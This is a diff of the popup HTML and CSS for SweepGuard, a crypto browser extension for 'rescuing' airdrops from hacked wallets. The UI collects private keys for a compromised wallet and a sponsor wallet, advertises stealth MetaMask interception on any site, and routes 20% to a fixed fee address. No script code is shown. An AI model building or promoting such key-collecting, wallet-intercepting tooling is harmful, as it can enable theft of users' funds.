@@ -1,328 +1,263 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SweepGuard v3</title>
   <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    :root{--bg:#0a0a0f;--card:#12121a;--border:rgba(255,255,255,0.06);--text:#fff;--dim:rgba(255,255,255,0.5);--accent:#10b981;--glow:rgba(16,185,129,0.2);--red:#ef4444;--yellow:#f59e0b;--purple:#8b5cf6;--blue:#3b82f6}
-    body{width:400px;min-height:500px;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;overflow-x:hidden}
-    
-    /* Header */
-    .hdr{padding:16px 20px;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(139,92,246,0.1));border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
-    .logo{display:flex;align-items:center;gap:10px}
-    .logo-i{width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--purple));border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px}
-    .logo-t{font-size:18px;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-    .ver{font-size:10px;color:var(--dim);background:rgba(255,255,255,0.05);padding:2px 8px;border-radius:10px}
-    
-    /* Tabs */
-    .tabs{display:flex;padding:12px 16px 0;gap:4px}
-    .tab{flex:1;padding:10px 6px;background:transparent;border:none;color:var(--dim);font-size:10px;font-weight:600;cursor:pointer;border-radius:8px 8px 0 0;transition:all 0.2s;text-align:center}
-    .tab:hover{color:var(--text);background:rgba(255,255,255,0.03)}
-    .tab.active{color:var(--accent);background:var(--card);border:1px solid var(--border);border-bottom:none}
-    .tab-i{font-size:16px;display:block;margin-bottom:4px}
-    
-    /* Content */
-    .cnt{padding:16px}
-    .tc{display:none}.tc.active{display:block}
-    
-    /* Cards */
-    .card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:12px}
-    .card-h{display:flex;align-items:center;gap:8px;margin-bottom:12px}
-    .card-i{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px}
-    .card-t{font-size:13px;font-weight:600}
-    .card-st{font-size:11px;color:var(--dim)}
-    
-    /* Input */
-    .ig{margin-bottom:12px}
-    .il{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px}
-    .dot{width:6px;height:6px;border-radius:50%}.dr{background:var(--red)}.dg{background:var(--accent)}.dy{background:var(--yellow)}.dp{background:var(--purple)}
-    input,select{width:100%;padding:10px 12px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;font-family:'SF Mono','Fira Code',monospace;transition:all 0.2s}
-    input:focus,select:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px var(--glow)}
-    input::placeholder{color:rgba(255,255,255,0.2)}
-    select{cursor:pointer;appearance:none}
-    
-    /* Buttons */
-    .btn{width:100%;padding:12px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:8px}
-    .bp{background:linear-gradient(135deg,var(--accent),#059669);color:#fff}
-    .bp:hover{transform:translateY(-1px);box-shadow:0 4px 12px var(--glow)}
-    .bp:disabled{opacity:0.5;cursor:not-allowed;transform:none}
-    .br{background:linear-gradient(135deg,var(--red),#dc2626);color:#fff}
-    .bpu{background:linear-gradient(135deg,var(--purple),#7c3aed);color:#fff}
-    .bo{background:transparent;border:1px solid var(--border);color:var(--dim)}
-    .bo:hover{border-color:var(--accent);color:var(--accent)}
-    
-    /* Status */
-    .st-bar{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(16,185,129,0.05);border:1px solid rgba(16,185,129,0.1);border-radius:8px;margin-bottom:12px}
-    .st-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:pulse 2s infinite}
-    @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
-    .st-txt{font-size:12px;color:var(--accent)}
-    
-    /* Chain Grid */
-    .cg{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-top:8px}
-    .cb{padding:8px 4px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:6px;color:var(--dim);font-size:10px;cursor:pointer;transition:all 0.2s;text-align:center}
-    .cb:hover{border-color:var(--accent);color:var(--accent)}
-    .cb.sel{background:var(--glow);border-color:var(--accent);color:var(--accent)}
-    .cb-i{font-size:14px;display:block;margin-bottom:2px}
-    
-    /* Fee Grid */
-    .fg{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:12px}
-    .fb{padding:10px 6px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:8px;color:var(--dim);cursor:pointer;transition:all 0.2s;text-align:center;display:flex;flex-direction:column;align-items:center;gap:4px}
-    .fb:hover{border-color:var(--yellow);color:var(--yellow)}
-    .fb.sel{background:rgba(245,158,11,0.1);border-color:var(--yellow);color:var(--yellow)}
-    .fb-i{font-size:18px}.fb-l{font-size:11px;font-weight:600}.fb-t{font-size:9px;color:var(--dim)}.fb-p{font-size:10px;font-weight:600;color:var(--accent)}
-    
-    /* Fee Display */
-    .fd{background:linear-gradient(135deg,rgba(139,92,246,0.1),rgba(16,185,129,0.1));border:1px solid rgba(139,92,246,0.2);border-radius:10px;padding:14px;margin:12px 0}
-    .fr{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
-    .fl{font-size:12px;color:var(--dim)}.fv{font-size:13px;font-weight:600}
-    .fv.g{color:var(--accent)}.fv.p{color:var(--purple)}
-    .fdiv{height:1px;background:var(--border);margin:8px 0}
-    
-    /* Results */
-    .ri{padding:12px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;margin-bottom:8px}
-    .ri.ok{border-color:rgba(16,185,129,0.2);background:rgba(16,185,129,0.05)}
-    .ri.err{border-color:rgba(239,68,68,0.2);background:rgba(239,68,68,0.05)}
-    
-    /* Loading */
-    .ld{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.1);border-top-color:var(--accent);border-radius:50%;animation:spin 0.8s linear infinite}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    
-    /* Toggle */
-    .tr{display:flex;justify-content:space-between;align-items:center;padding:10px 0}
-    .tl{font-size:12px}
-    .tg{width:40px;height:22px;background:rgba(255,255,255,0.1);border-radius:11px;position:relative;cursor:pointer;transition:all 0.2s}
-    .tg.on{background:var(--accent)}
-    .tg::after{content:'';position:absolute;width:18px;height:18px;background:#fff;border-radius:50%;top:2px;left:2px;transition:all 0.2s}
-    .tg.on::after{left:20px}
-    
-    /* Info */
-    .info{padding:10px 12px;background:rgba(59,130,246,0.05);border:1px solid rgba(59,130,246,0.1);border-radius:8px;font-size:11px;color:rgba(59,130,246,0.8);line-height:1.5}
-    
-    /* Page Status */
-    .ps{padding:12px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;margin-bottom:12px}
-    .ps.det{border-color:rgba(16,185,129,0.3);background:rgba(16,185,129,0.05)}
-    .ps-t{font-size:12px;font-weight:600;margin-bottom:4px}
-    .ps-u{font-size:10px;color:var(--dim);font-family:monospace;word-break:break-all}
-    
-    /* Wallet Info */
-    .wi{padding:8px 10px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:6px;font-size:10px;font-family:monospace;color:var(--dim);margin-top:4px;word-break:break-all}
-    
-    /* Stealth */
-    .stealth{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;background:rgba(139,92,246,0.1);border:1px solid rgba(139,92,246,0.2);border-radius:10px;font-size:10px;color:var(--purple)}
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      width: 380px;
+      min-height: 500px;
+      background: #0a0a0f;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-size: 13px;
+    }
+    .header {
+      padding: 16px;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .header h1 {
+      font-size: 16px;
+      background: linear-gradient(to right, #4ade80, #10b981);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+    }
+    .tab {
+      flex: 1;
+      padding: 10px;
+      text-align: center;
+      cursor: pointer;
+      color: rgba(255,255,255,0.3);
+      font-size: 11px;
+      transition: all 0.2s;
+    }
+    .tab.active {
+      color: #4ade80;
+      border-bottom: 2px solid #4ade80;
+    }
+    .content { padding: 16px; }
+    .section { margin-bottom: 16px; }
+    .section-title {
+      font-size: 11px;
+      color: rgba(255,255,255,0.3);
+      margin-bottom: 6px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px 10px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 6px;
+      color: #fff;
+      font-size: 11px;
+      outline: none;
+    }
+    input:focus, select:focus {
+      border-color: rgba(74,222,128,0.5);
+    }
+    .btn {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 12px;
+      transition: all 0.2s;
+    }
+    .btn-primary {
+      background: linear-gradient(to right, #4ade80, #10b981);
+      color: #000;
+    }
+    .btn-secondary {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.05);
+      color: rgba(255,255,255,0.5);
+    }
+    .btn-blue {
+      background: linear-gradient(to right, #3b82f6, #06b6d4);
+      color: #fff;
+    }
+    .status {
+      padding: 8px 10px;
+      border-radius: 6px;
+      font-size: 11px;
+      margin-bottom: 10px;
+    }
+    .status-green { background: rgba(74,222,128,0.1); color: #4ade80; }
+    .status-red { background: rgba(239,68,68,0.1); color: #ef4444; }
+    .status-blue { background: rgba(59,130,246,0.1); color: #3b82f6; }
+    .status-yellow { background: rgba(234,179,8,0.1); color: #eab308; }
+    .info-box {
+      padding: 10px;
+      background: rgba(74,222,128,0.05);
+      border: 1px solid rgba(74,222,128,0.1);
+      border-radius: 8px;
+      margin-bottom: 12px;
+    }
+    .info-box p {
+      color: rgba(255,255,255,0.4);
+      font-size: 11px;
+      line-height: 1.5;
+    }
+    .info-box strong { color: #4ade80; }
+    .chain-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 4px;
+    }
+    .chain-btn {
+      padding: 6px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 6px;
+      color: rgba(255,255,255,0.3);
+      font-size: 10px;
+      cursor: pointer;
+      text-align: center;
+    }
+    .chain-btn.active {
+      background: rgba(74,222,128,0.1);
+      border-color: rgba(74,222,128,0.3);
+      color: #4ade80;
+    }
+    .hidden { display: none; }
+    .divider {
+      height: 1px;
+      background: rgba(255,255,255,0.05);
+      margin: 12px 0;
+    }
+    .split-preview {
+      padding: 10px;
+      background: rgba(255,255,255,0.02);
+      border-radius: 8px;
+      margin: 10px 0;
+    }
+    .split-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 4px 0;
+      font-size: 11px;
+    }
   </style>
 </head>
 <body>
-  <!-- Header -->
-  <div class="hdr">
-    <div class="logo"><div class="logo-i">🛡️</div><span class="logo-t">SweepGuard</span></div>
-    <span class="ver">v3.0</span>
+  <div class="header">
+    <span style="font-size: 20px;">🛡️</span>
+    <h1>SweepGuard</h1>
+    <span style="margin-left: auto; font-size: 10px; color: rgba(255,255,255,0.2);">v4.0</span>
   </div>
 
-  <!-- Tabs -->
   <div class="tabs">
-    <button class="tab active" data-tab="wallets"><span class="tab-i">👛</span>Wallets</button>
-    <button class="tab" data-tab="claim"><span class="tab-i">🎯</span>Claim</button>
-    <button class="tab" data-tab="transfer"><span class="tab-i">💸</span>Transfer</button>
-    <button class="tab" data-tab="settings"><span class="tab-i">⚙️</span>Settings</button>
+    <div class="tab active" data-tab="wallets">Wallets</div>
+    <div class="tab" data-tab="claim">Claim</div>
+    <div class="tab" data-tab="settings">Settings</div>
   </div>
 
-  <div class="cnt">
-    <!-- ===== WALLETS TAB ===== -->
-    <div class="tc active" id="tab-wallets">
-      <div class="st-bar">
-        <div class="st-dot"></div>
-        <span class="st-txt">Extension Active</span>
-        <span class="stealth">👻 Stealth</span>
-      </div>
-
-      <!-- Current Page -->
-      <div class="ps" id="pageStatus">
-        <div class="ps-t">🔍 Current Page</div>
-        <div class="ps-u" id="currentUrl">Loading...</div>
-      </div>
-
-      <!-- Hacked Wallet -->
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(239,68,68,0.1)">🔴</div>
-          <div><div class="card-t">Hacked Wallet</div><div class="card-st">Private key of compromised wallet</div></div>
-        </div>
-        <div class="ig"><input type="password" id="hackedKey" placeholder="0x... private key"></div>
-      </div>
-
-      <!-- Sponsor Wallet -->
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(245,158,11,0.1)">💰</div>
-          <div><div class="card-t">Sponsor Wallet</div><div class="card-st">Wallet with ETH for gas</div></div>
-        </div>
-        <div class="ig"><input type="password" id="sponsorKey" placeholder="0x... private key (has gas)"></div>
-      </div>
-
-      <!-- Safe Wallet -->
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(16,185,129,0.1)">🟢</div>
-          <div><div class="card-t">Safe Wallet</div><div class="card-st">Where tokens will be sent (80%)</div></div>
-        </div>
-        <div class="ig"><input type="text" id="safeWallet" placeholder="0x... your safe wallet address"></div>
-      </div>
-
-      <button class="btn bp" id="saveWalletsBtn">💾 Save Wallets</button>
-      
-      <div id="walletStatus" style="margin-top:12px;"></div>
+  <!-- WALLETS TAB -->
+  <div id="wallets" class="content">
+    <div class="info-box">
+      <p>🔒 <strong>Signature-Based Security</strong><br>
+      Your private key NEVER leaves your browser. You only sign an EIP-712 message. The smart contract handles everything atomically.</p>
     </div>
 
-    <!-- ===== CLAIM TAB ===== -->
-    <div class="tc" id="tab-claim">
-      <div class="info" style="margin-bottom:12px;">
-        🎯 Go to any airdrop page → Click "Connect Wallet" → SweepGuard popup shows → Connect → Click Claim → Confirm → Done!
-      </div>
-
-      <!-- Chain Auto-Detect -->
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(139,92,246,0.1)">🔗</div>
-          <div><div class="card-t">Chain (Auto-Detected)</div><div class="card-st">Detected from page</div></div>
-        </div>
-        <div class="cg" id="chainGrid">
-          <button class="cb sel" data-chain="1"><span class="cb-i">⟠</span>ETH</button>
-          <button class="cb" data-chain="8453"><span class="cb-i">🔵</span>Base</button>
-          <button class="cb" data-chain="56"><span class="cb-i">🟡</span>BSC</button>
-          <button class="cb" data-chain="42161"><span class="cb-i">🔷</span>Arb</button>
-          <button class="cb" data-chain="137"><span class="cb-i">🟣</span>Polygon</button>
-          <button class="cb" data-chain="10"><span class="cb-i">🔴</span>OP</button>
-          <button class="cb" data-chain="43114"><span class="cb-i">🔺</span>AVAX</button>
-          <button class="cb" data-chain="250"><span class="cb-i">👻</span>FTM</button>
-          <button class="cb" data-chain="81457"><span class="cb-i">💥</span>Blast</button>
-          <button class="cb" data-chain="324"><span class="cb-i">🔷</span>zkSync</button>
-          <button class="cb" data-chain="59144"><span class="cb-i">🟢</span>Linea</button>
-          <button class="cb" data-chain="11155111"><span class="cb-i">🧪</span>Sepolia</button>
-        </div>
-      </div>
-
-      <!-- Network Fee -->
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(245,158,11,0.1)">⛽</div>
-          <div><div class="card-t">Network Fee (Auto-Selected)</div><div class="card-st">Best fee mode chosen automatically</div></div>
-        </div>
-        <div class="fg">
-          <button class="fb" data-mode="slow"><span class="fb-i">🐢</span><span class="fb-l">Slow</span><span class="fb-t">~5 min</span><span class="fb-p" id="feeSlow">-</span></button>
-          <button class="fb sel" data-mode="medium"><span class="fb-i">🚗</span><span class="fb-l">Medium</span><span class="fb-t">~2 min</span><span class="fb-p" id="feeMedium">-</span></button>
-          <button class="fb" data-mode="aggressive"><span class="fb-i">🚀</span><span class="fb-l">Aggressive</span><span class="fb-t">~30 sec</span><span class="fb-p" id="feeAggressive">-</span></button>
-        </div>
-      </div>
-
-      <!-- Split Display -->
-      <div class="fd">
-        <div style="text-align:center;margin-bottom:8px;color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:1px">Token Distribution</div>
-        <div class="fr">
-          <span class="fl">🟢 80% → Safe Wallet</span>
-          <span class="fv g" id="userAmount">-</span>
-        </div>
-        <div class="fdiv"></div>
-        <div class="fr">
-          <span class="fl">🟣 20% → Platform Fee</span>
-          <span class="fv p" id="feeAmount">-</span>
-        </div>
-        <div class="fdiv"></div>
-        <div class="fr">
-          <span class="fl">⛽ Gas</span>
-          <span class="fv" style="color:var(--accent)">Sponsored</span>
-        </div>
-        <div class="fr">
-          <span class="fl">🔒 Method</span>
-          <span class="fv" style="color:var(--dim);font-size:11px">Flashbots Atomic</span>
-        </div>
-      </div>
-
-      <!-- Token Input -->
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(59,130,246,0.1)">📊</div>
-          <div><div class="card-t">Token Info</div><div class="card-st">Auto-detected from page</div></div>
-        </div>
-        <div class="ig">
-          <div class="il"><span class="dot dy"></span>Claim Contract</div>
-          <input type="text" id="claimContract" placeholder="0x... (auto-detected)">
-        </div>
-        <div class="ig">
-          <div class="il"><span class="dot dg"></span>Token Amount</div>
-          <input type="text" id="tokenAmount" placeholder="100 (auto-detected)">
-        </div>
-      </div>
-
-      <button class="btn bp" id="claimBtn">🎯 Claim & Split — 1 TX</button>
-
-      <div id="claimResults" style="margin-top:12px;"></div>
+    <div class="section">
+      <div class="section-title">Hacked Wallet Private Key</div>
+      <input type="password" id="hackedKey" placeholder="0x..." />
+    </div>
+    <div class="section">
+      <div class="section-title">Safe Wallet (receives 80%)</div>
+      <input type="text" id="safeWallet" placeholder="0x..." />
+    </div>
+    <div class="section">
+      <div class="section-title">Sponsor Wallet Address (pays gas)</div>
+      <input type="text" id="sponsorWallet" placeholder="0x..." />
+    </div>
+    <div class="section">
+      <div class="section-title">Sponsor Private Key</div>
+      <input type="password" id="sponsorKey" placeholder="0x..." />
     </div>
 
-    <!-- ===== TRANSFER TAB ===== -->
-    <div class="tc" id="tab-transfer">
-      <div class="info" style="margin-bottom:12px;">
-        💸 Transfer tokens from compromised wallet to safe wallet using sponsor gas.
-      </div>
+    <button id="saveWallets" class="btn btn-primary" style="margin-top: 12px;">Save Wallets</button>
+    <div id="saveStatus" class="status hidden"></div>
+  </div>
 
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(139,92,246,0.1)">📥</div>
-          <div><div class="card-t">Transfer Tokens</div><div class="card-st">Move tokens to safe wallet</div></div>
-        </div>
-        <div class="ig">
-          <div class="il"><span class="dot dp"></span>Token Address</div>
-          <input type="text" id="tokenAddr" placeholder="0x... token contract (or ETH)">
-        </div>
-        <div class="ig">
-          <div class="il"><span class="dot dg"></span>Amount</div>
-          <input type="text" id="transferAmt" placeholder="Amount or 'all'">
-        </div>
-        <button class="btn bpu" id="transferBtn">💸 Transfer to Safe Wallet</button>
-      </div>
-      <div id="transferResults" style="margin-top:12px;"></div>
+  <!-- CLAIM TAB -->
+  <div id="claim" class="content hidden">
+    <div class="info-box">
+      <p>🎯 <strong>How It Works</strong><br>
+      1. Go to any airdrop claim page<br>
+      2. Click "Claim" on the page<br>
+      3. SweepGuard intercepts → shows popup<br>
+      4. Sign EIP-712 message in MetaMask<br>
+      5. Smart contract claims + splits atomically</p>
     </div>
 
-    <!-- ===== SETTINGS TAB ===== -->
-    <div class="tc" id="tab-settings">
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(139,92,246,0.1)">⚙️</div>
-          <div><div class="card-t">Settings</div><div class="card-st">Configure extension</div></div>
-        </div>
-        <div class="tr"><span class="tl">Auto-detect claim pages</span><div class="tg on" id="tDetect"></div></div>
-        <div class="tr"><span class="tl">Stealth mode</span><div class="tg on" id="tStealth"></div></div>
-        <div class="tr"><span class="tl">Show notifications</span><div class="tg on" id="tNotify"></div></div>
-        <div class="tr"><span class="tl">Auto-select best fee</span><div class="tg on" id="tAutoFee"></div></div>
-        <div class="tr"><span class="tl">Flashbots private mempool</span><div class="tg on" id="tFlash"></div></div>
+    <div class="section">
+      <div class="section-title">Chain</div>
+      <div class="chain-grid">
+        <div class="chain-btn active" data-chain="1">Ethereum</div>
+        <div class="chain-btn" data-chain="8453">Base</div>
+        <div class="chain-btn" data-chain="42161">Arbitrum</div>
+        <div class="chain-btn" data-chain="137">Polygon</div>
+        <div class="chain-btn" data-chain="56">BSC</div>
+        <div class="chain-btn" data-chain="10">Optimism</div>
       </div>
+    </div>
 
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(16,185,129,0.1)">💾</div>
-          <div><div class="card-t">Data</div><div class="card-st">Save or clear</div></div>
-        </div>
-        <button class="btn bo" id="clearBtn" style="margin-top:8px">🗑️ Clear All Data</button>
-      </div>
+    <div class="section">
+      <div class="section-title">Airdrop Contract Address</div>
+      <input type="text" id="airdropContract" placeholder="0x..." />
+    </div>
 
-      <div class="card">
-        <div class="card-h">
-          <div class="card-i" style="background:rgba(59,130,246,0.1)">ℹ️</div>
-          <div><div class="card-t">SweepGuard v3.0</div><div class="card-st">Wallet Protector</div></div>
-        </div>
-        <div style="font-size:11px;color:var(--dim);line-height:1.6">
-          <p>🛡️ Intercept MetaMask on any site</p>
-          <p>🎯 Auto-detect claim pages</p>
-          <p>🔗 Auto-detect chain</p>
-          <p>📊 Show token amounts</p>
-          <p>💰 80/20 atomic split</p>
-          <p>⛽ Gas sponsored</p>
-          <p>🔒 Flashbots atomic bundles</p>
-          <p>🔗 15 chains supported</p>
-          <p style="margin-top:8px;color:var(--accent)">sweeptsguard.vercel.app</p>
-        </div>
+    <div class="divider"></div>
+
+    <div id="claimStatus" class="status hidden"></div>
+
+    <div id="splitPreview" class="split-preview hidden">
+      <div class="section-title">Token Split (80/20)</div>
+      <div class="split-row">
+        <span style="color: #4ade80;">→ Safe Wallet (80%)</span>
+        <span id="safeAmount" style="color: #4ade80;">--</span>
       </div>
+      <div class="split-row">
+        <span style="color: #a855f7;">→ Platform Fee (20%)</span>
+        <span id="feeAmount" style="color: #a855f7;">--</span>
+      </div>
+    </div>
+
+    <button id="signClaim" class="btn btn-blue" style="margin-top: 12px;">✍️ Sign & Claim (MetaMask)</button>
+    <button id="executeClaim" class="btn btn-primary hidden" style="margin-top: 8px;">⚡ Execute Claim</button>
+  </div>
+
+  <!-- SETTINGS TAB -->
+  <div id="settings" class="content hidden">
+    <div class="section">
+      <div class="section-title">Platform Fee Wallet</div>
+      <input type="text" value="0x7A3725154a2E6468F9549334394802e9E2822C2A" disabled />
+    </div>
+    <div class="section">
+      <div class="section-title">Platform Fee</div>
+      <input type="text" value="20%" disabled />
+    </div>
+    <div class="section">
+      <div class="section-title">Extension Version</div>
+      <input type="text" value="v4.0.0 (Signature-Based)" disabled />
+    </div>
+    <div class="info-box" style="margin-top: 16px;">
+      <p>🛡️ <strong>Security Model</strong><br>
+      • EIP-712 signature verification<br>
+      • One-time use (nonce prevents replay)<br>
+      • 10-minute deadline expiry<br>
+      • Atomic execution (claim + split in one TX)<br>
+      • 80/20 split enforced by smart contract</p>
     </div>
   </div>
 
